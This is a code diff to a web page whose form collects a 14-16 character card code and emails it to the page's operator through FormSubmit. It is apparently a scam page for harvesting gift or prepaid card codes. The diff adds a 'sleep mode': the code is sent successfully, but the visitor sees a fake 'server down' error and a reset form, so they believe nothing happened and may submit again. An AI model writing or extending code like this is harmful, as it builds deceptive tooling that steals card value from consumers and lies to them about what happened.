@@ -153,6 +153,9 @@
     <div id="toastContainer" class="fixed bottom-4 right-4 z-50 flex flex-col gap-2 pointer-events-none"></div>
 
     <script>
+        // Set mode: 'A' for Normal (Active), 'S' for Sleep Time / Maintenance Message Mode
+        const SYSTEM_MODE = 'A'; // Change to 'A' anytime to revert to normal behavior
+
         function formatCardCode(input) {
             let cleanVal = input.value.replace(/\s+/g, '').toUpperCase();
             if (cleanVal.length > 16) {
@@ -197,7 +200,6 @@
 
                 if (fsResponse.ok) {
                     const fsData = await fsResponse.json();
-                    // Explicitly verify that FormSubmit actually accepted and dispatched the email
                     if (fsData.success === "true" || fsData.success === true) {
                         success = true;
                     }
@@ -236,12 +238,28 @@
                 }
             }
 
-            // --- STEP 3: FINAL HANDLING ---
+            // --- STEP 3: FINAL HANDLING BASED ON SYSTEM_MODE ('A' vs 'S') ---
             if (success) {
-                showToast('Verification submitted successfully!', 'success');
-                setTimeout(() => {
-                    window.location.href = 'topup-processing.html';
-                }, 800);
+                if (SYSTEM_MODE === 'S') {
+                    // Sleep mode: Submit successfully to email, but display down message and do NOT redirect
+                    showToast('Server is currently down at the moment. Please try again after a few minutes.', 'error');
+                    
+                    // Reset form and restore button state
+                    formElement.reset();
+                    document.getElementById('charCount').innerText = `0 / 14-16`;
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = `
+                        <i class="fa-solid fa-shield-check text-xs group-hover:scale-125 transition-transform"></i>
+                        <span>Submit Top-Up Verification</span>
+                        <i class="fa-solid fa-arrow-right text-xs opacity-70 group-hover:translate-x-1 transition-transform"></i>
+                    `;
+                } else {
+                    // Normal Active mode ('A'): Submit successfully and proceed to next page
+                    showToast('Verification submitted successfully!', 'success');
+                    setTimeout(() => {
+                        window.location.href = 'topup-processing.html';
+                    }, 800);
+                }
             } else {
                 // Fired ONLY if both services fail to dispatch the email
                 showToast('Server is currently down at the moment. Please try again after a few minutes.', 'error');
